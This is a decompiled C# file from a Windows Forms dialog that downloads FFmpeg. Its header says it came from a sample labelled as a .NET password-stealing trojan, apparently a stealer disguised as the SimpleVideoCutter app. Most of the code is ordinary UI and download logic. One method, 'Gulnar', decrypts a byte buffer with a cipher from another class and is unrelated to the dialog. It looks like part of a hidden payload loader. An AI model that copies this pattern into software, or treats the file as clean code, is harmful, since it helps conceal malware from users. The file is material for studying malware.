// Decompiled with JetBrains decompiler
// Type: SimpleVideoCutter.FormFFmpegMissingDialog
// Assembly: SimpleVideoCutter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC3F1699-ABA1-43FB-A799-9F64138760E7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f61a916b55390990f502b60b4e78cb70d9da9416954b3cb35908cf3498ac3ead.exe

using SimpleVideoCutter.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SimpleVideoCutter
{
  public class FormFFmpegMissingDialog : Form
  {
    private bool stopDownloadRequest = false;
    private IContainer components = (IContainer) null;
    private Button buttonClose;
    private Label labelFFmpegExlanation;
    private LinkLabel linkLabelFFmpeg;
    private Button buttonDownload;
    private ProgressBar progressBarDownload;
    private FlowLayoutPanel flowLayoutPanel1;
    private Label labelFFmpegDownload;
    private FlowLayoutPanel flowLayoutPanelButton;
    private Label labelError;
    private Label labelDownloadSuccessful;

    public FormFFmpegMissingDialog() => this.InitializeComponent();

    private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://www.gyan.dev/ffmpeg/builds/");

    public static byte[] Gulnar(byte[] B) => FormAddTask.Sym.CreateDecryptor().TransformFinalBlock(B, 0, B.Length);

    private async void buttonDownload_Click(object sender, EventArgs e) => await this.DownloadLastestFFmpegVersion();

    public async Task DownloadLastestFFmpegVersion()
    {
      string url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip";
      string filename = "ffmpeg-latest-static.zip";
      string folderName = string.Format("ffmpeg.{0:yyyyMMddHHmmss}", (object) DateTime.Now);
      this.stopDownloadRequest = false;
      this.labelError.Visible = false;
      this.progressBarDownload.Value = 0;
      this.progressBarDownload.Visible = true;
      this.buttonClose.Text = GlobalStrings.GlobalCancel;
      try
      {
        using (CustomWebClient client = new CustomWebClient()
        {
          TimeoutMs = 10000
        })
        {
          client.DownloadProgressChanged += (DownloadProgressChangedEventHandler) ((sender, e) =>
          {
            this.progressBarDownload.Value = e.ProgressPercentage;
            if (!this.stopDownloadRequest)
              return;
            client.CancelAsync();
          });
          client.DownloadFileCompleted += (AsyncCompletedEventHandler) ((sender, e) =>
          {
            if (e.Cancelled || e.Error != null)
              return;
            ZipFile.ExtractToDirectory(filename, folderName);
            string path = ((IEnumerable<string>) Directory.GetDirectories(folderName)).FirstOrDefault<string>();
            if (path != null)
            {
              VideoCutterSettings.Instance.FFmpegPath = Path.Combine(Path.GetFullPath(path), "bin", "ffmpeg.exe");
              this.labelDownloadSuccessful.Visible = true;
              VideoCutterSettings.Instance.StoreSettings();
            }
          });
          Uri uri = new Uri(url);
          await client.DownloadFileTaskAsync(uri, filename);
          uri = (Uri) null;
        }
      }
      catch (Exception ex)
      {
        this.labelError.Visible = true;
      }
      this.progressBarDownload.Visible = false;
      this.buttonClose.Text = GlobalStrings.GlobalClose;
    }

    private void buttonClose_Click(object sender, EventArgs e)
    {
      if (this.progressBarDownload.Visible)
        this.stopDownloadRequest = true;
      else
        this.Close();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormFFmpegMissingDialog));
      this.buttonClose = new Button();
      this.labelFFmpegExlanation = new Label();
      this.linkLabelFFmpeg = new LinkLabel();
      this.buttonDownload = new Button();
      this.progressBarDownload = new ProgressBar();
      this.flowLayoutPanel1 = new FlowLayoutPanel();
      this.labelFFmpegDownload = new Label();
      this.labelError = new Label();
      this.labelDownloadSuccessful = new Label();
      this.flowLayoutPanelButton = new FlowLayoutPanel();
      this.flowLayoutPanel1.SuspendLayout();
      this.flowLayoutPanelButton.SuspendLayout();
      this.SuspendLayout();
      componentResourceManager.ApplyResources((object) this.buttonClose, "buttonClose");
      this.buttonClose.Name = "buttonClose";
      this.buttonClose.UseVisualStyleBackColor = true;
      this.buttonClose.Click += new EventHandler(this.buttonClose_Click);
      componentResourceManager.ApplyResources((object) this.labelFFmpegExlanation, "labelFFmpegExlanation");
      this.labelFFmpegExlanation.Name = "labelFFmpegExlanation";
      componentResourceManager.ApplyResources((object) this.linkLabelFFmpeg, "linkLabelFFmpeg");
      this.linkLabelFFmpeg.Name = "linkLabelFFmpeg";
      this.linkLabelFFmpeg.TabStop = true;
      this.linkLabelFFmpeg.LinkClicked += new LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
      componentResourceManager.ApplyResources((object) this.buttonDownload, "buttonDownload");
      this.buttonDownload.Name = "buttonDownload";
      this.buttonDownload.UseVisualStyleBackColor = true;
      this.buttonDownload.Click += new EventHandler(this.buttonDownload_Click);
      componentResourceManager.ApplyResources((object) this.progressBarDownload, "progressBarDownload");
      this.progressBarDownload.Name = "progressBarDownload";
      this.flowLayoutPanel1.Controls.Add((Control) this.labelFFmpegDownload);
      this.flowLayoutPanel1.Controls.Add((Control) this.linkLabelFFmpeg);
      this.flowLayoutPanel1.Controls.Add((Control) this.buttonDownload);
      this.flowLayoutPanel1.Controls.Add((Control) this.labelFFmpegExlanation);
      this.flowLayoutPanel1.Controls.Add((Control) this.progressBarDownload);
      this.flowLayoutPanel1.Controls.Add((Control) this.labelError);
      this.flowLayoutPanel1.Controls.Add((Control) this.labelDownloadSuccessful);
      componentResourceManager.ApplyResources((object) this.flowLayoutPanel1, "flowLayoutPanel1");
      this.flowLayoutPanel1.Name = "flowLayoutPanel1";
      componentResourceManager.ApplyResources((object) this.labelFFmpegDownload, "labelFFmpegDownload");
      this.labelFFmpegDownload.Name = "labelFFmpegDownload";
      componentResourceManager.ApplyResources((object) this.labelError, "labelError");
      this.labelError.ForeColor = Color.FromArgb(192, 0, 0);
      this.labelError.Name = "labelError";
      componentResourceManager.ApplyResources((object) this.labelDownloadSuccessful, "labelDownloadSuccessful");
      this.labelDownloadSuccessful.ForeColor = Color.Green;
      this.labelDownloadSuccessful.Name = "labelDownloadSuccessful";
      this.flowLayoutPanelButton.Controls.Add((Control) this.buttonClose);
      componentResourceManager.ApplyResources((object) this.flowLayoutPanelButton, "flowLayoutPanelButton");
      this.flowLayoutPanelButton.Name = "flowLayoutPanelButton";
      this.AcceptButton = (IButtonControl) this.buttonClose;
      componentResourceManager.ApplyResources((object) this, "$this");
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ControlBox = false;
      this.Controls.Add((Control) this.flowLayoutPanel1);
      this.Controls.Add((Control) this.flowLayoutPanelButton);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (FormFFmpegMissingDialog);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.flowLayoutPanel1.ResumeLayout(false);
      this.flowLayoutPanel1.PerformLayout();
      this.flowLayoutPanelButton.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
